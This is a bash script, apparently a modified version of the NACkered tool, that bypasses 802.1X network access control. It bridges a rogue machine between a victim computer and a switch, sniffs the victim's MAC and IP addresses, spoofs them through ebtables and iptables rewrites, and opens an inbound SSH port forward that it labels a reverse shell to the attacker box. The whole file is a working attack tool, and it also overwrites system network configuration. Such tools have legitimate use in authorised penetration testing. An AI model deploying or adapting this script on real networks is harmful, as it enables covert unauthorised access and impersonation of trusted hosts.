#!/bin/bash
## Script modified by Chester Taupieka and Jeremy Schoeneman, 2019
## Thanks to Matt E - NACkered v2.92.2 - KPMG LLP 2014

dhclient -r
pkill dhcpcd
modprobe br_netfilter

if [ "$1" == "-h" ] ; then
	echo -e "Info: `basename $0`\n\n[-h or --help]\t\t+Display this help information\n[-v or --version]\t+Display version information\n[-a or --about]\t\t+Display usage information\n[--phone]\t\t+Bypass IP Phone"
	exit 0
fi
if [ "$1" == "-v" ] ; then
	echo -e "Version: `basename $0` 2.92 Automatic\nMatt E\nKPMG LLP 2014"
	exit 0
fi
if [ "$1" == "--version" ] ; then
	echo -e "Version: `basename $0` 3.0 - Jeremy/Chet Edits to Matt E's Original Script"
	exit 0
fi
if [ "$1" == "--help" ] ; then
	echo -e "Info: `basename $0`\n\n[-h or --help]\t\t+Display this help information\n[-v or --version]\t+Display version information\n[-a or --about]\t\t+Display usage information"
	exit 0
fi
if [ "$1" == "-a" ] ; then
	echo -e "Insert Info about script here"
	exit 0
fi
if [ "$1" == "--about" ] ; then
	echo -e "Insert info about script here"
	exit 0
fi

LPORT=443

if [ "$1" == "--phone" ] ; then
	LPORT=5061
fi

service network-manager stop
echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
sysctl -p
echo "" > /etc/resolv.conf

BRINT=br0 #bridge interface
ININT=eth2 #interface of laptop to kill (we prefer to use two usb2eth's)
SWINT=eth1 #interface of usb2eth plugged into switch
SWMAC=`ifconfig $SWINT | grep -i ether | awk '{ print $2 }'` #get SWINT MAC address automatically.
COMPINT=eth0 #interface of usb2eth plugged into victim machine
BRIP=169.254.66.66 #IP for the bridge
DPORT=2222 #SSH CALL BACK PORT USE victimip:2222 to connect to attackerbox:22
RANGE=61000-62000 #Ports for my traffic on NAT

brctl addbr $BRINT #Make bridge
brctl addif $BRINT $COMPINT #add computer side to bridge
brctl addif $BRINT $SWINT #add switch side to bridge

echo 8 > /sys/class/net/br0/bridge/group_fwd_mask #forward EAP packets
echo 1 > /proc/sys/net/bridge/bridge-nf-call-iptables

ifconfig $COMPINT 0.0.0.0 up promisc #bring up comp interface
ifconfig $SWINT 0.0.0.0 up promisc #bring up switch interface

echo 
read -p "Bridge Configured, Press any key..." -n1 -s
echo 

macchanger -m 00:12:34:56:78:90 $BRINT #Swap MAC of bridge to an initialisation value (not important what)
macchanger -m $SWMAC $BRINT #Swap MAC of bridge to the switch side MAC

echo "Bringing up the Bridge"				
ifconfig $BRINT 0.0.0.0 up promisc #BRING UP BRIDGE

echo 
read -p "Bridge up, should be dark, Connect Ethernet cables to adatapers and leave to steady (watch the lights make sure they don't go out!) Wait for 30seconds then press any key..." -n1 -s
echo 

echo "Resetting Connection"
mii-tool -r $COMPINT
mii-tool -r $SWINT

echo "Listening for Traffic on port $dport"
tcpdump -i $COMPINT -s0 -w /boot.pcap -c1 tcp dst port $LPORT #moving to look at either https or sip traffic
echo

echo "Processing packet and setting veriables COMPMAC GWMAC COMIP"
COMPMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port $dport | awk '{print $2","$4$10}' | cut -f 1-4 -d.| awk -F ',' '{print $1}'`
echo $COMPMAC
GWMAC=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port $dport | awk '{print $2","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $2}'`
echo $GWMAC
COMIP=`tcpdump -r /boot.pcap -nne -c 1 tcp dst port $dport | awk '{print $3","$4$10}' |cut -f 1-4 -d.| awk -F ',' '{print $3}'`
echo $COMIP
echo "Going Silent"
arptables -A OUTPUT -j DROP
iptables -A OUTPUT -j DROP

echo "Bringing up interface with bridge side IP"
ifconfig $BRINT $BRIP up promisc

# Anything leaving this box with the switch side MAC on the switch interface or bridge interface rewrite and give it the victims MAC
echo "Setting up Layer 2 rewrite"
ebtables -t nat -A POSTROUTING -s $SWMAC -o $SWINT -j snat --to-src $COMPMAC
ebtables -t nat -A POSTROUTING -s $SWMAC -o $BRINT -j snat --to-src $COMPMAC

#Create default routes so we can route traffic - all traffic goes to 169.254.66.1 and this traffic gets Layer 2 sent to GWMAC
echo "Adding default routes"
arp -s -i $BRINT 169.254.66.1 $GWMAC
route add default gw 169.254.66.1

#SSH CALLBACK if we receieve inbound on br0 for VICTIMIP:DPORT forward to BRIP on 22 (SSH)
echo "Setting up SSH reverse shell inbound on BICTIMIP:2222 to ATTACKERIP:22"
iptables -t nat -A PREROUTING -i br0 -d $COMIP -p tcp --dport $DPORT -j DNAT --to $BRIP:22

#Anything on any protocol leaving OS on BRINT with BRIP rewrite it to COMPIP and give it a port in the range for NAT
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP

echo "Re-enabling traffic flow; monitor ports for lockout"

arptables -D OUTPUT -j DROP
iptables -D OUTPUT -j DROP

echo
iptables -L -t nat
echo 
echo "You're all set! Happy Hunting!"

